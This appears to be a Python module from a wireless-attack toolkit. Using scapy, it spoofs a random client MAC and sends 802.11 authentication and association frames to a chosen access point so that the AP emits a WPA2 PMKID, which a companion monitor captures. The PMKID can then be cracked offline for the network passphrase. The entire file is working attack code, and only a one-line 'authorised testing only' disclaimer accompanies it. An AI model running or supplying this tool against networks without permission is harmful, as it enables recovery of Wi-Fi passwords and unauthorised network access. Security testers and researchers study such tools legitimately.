"""Active PMKID solicitation.

Sends an authentication + association request to an AP so it begins the EAPOL
handshake and (on many APs) emits message 1 with a PMKID — which the running
passive monitor then captures. Best-effort: association state machines vary by
AP, so this nudges the AP rather than completing a full association.

For authorised testing only.
"""

from __future__ import annotations

import random
from typing import Callable, Optional

from scapy.all import (  # type: ignore
    Dot11,
    Dot11AssoReq,
    Dot11Auth,
    Dot11Elt,
    RadioTap,
    sendp,
)

# RSN IE: WPA2-PSK, CCMP group + pairwise, AKM PSK, no RSN capabilities.
# version | group(CCMP) | pair_count | pair(CCMP) | akm_count | akm(PSK) | caps
RSN_IE = bytes.fromhex("0100" "000fac04" "0100" "000fac04" "0100" "000fac02" "0000")


def random_client_mac() -> str:
    """A locally-administered (randomized) source MAC for the fake client."""
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def request_pmkid(
    interface: str,
    bssid: str,
    essid: str = "",
    channel: Optional[int] = None,
    client_mac: Optional[str] = None,
    log: Optional[Callable[[str], None]] = None,
) -> str:
    """Send auth + association request toward ``bssid``. Returns the client MAC used."""
    client_mac = client_mac or random_client_mac()
    ssid_bytes = (essid or "").encode(errors="ignore")

    auth = (
        RadioTap()
        / Dot11(type=0, subtype=11, addr1=bssid, addr2=client_mac, addr3=bssid)
        / Dot11Auth(algo=0, seqnum=1, status=0)
    )
    assoc = (
        RadioTap()
        / Dot11(type=0, subtype=0, addr1=bssid, addr2=client_mac, addr3=bssid)
        / Dot11AssoReq(cap=0x1100, listen_interval=0x000A)
        / Dot11Elt(ID=0, info=ssid_bytes)
        / Dot11Elt(ID=48, info=RSN_IE)
    )
    sendp(auth, iface=interface, count=1, inter=0.05, verbose=False)
    sendp(assoc, iface=interface, count=1, inter=0.05, verbose=False)
    if log:
        log(f"PMKID-запрос: auth+assoc к {bssid} от {client_mac} (канал {channel})")
    return client_mac
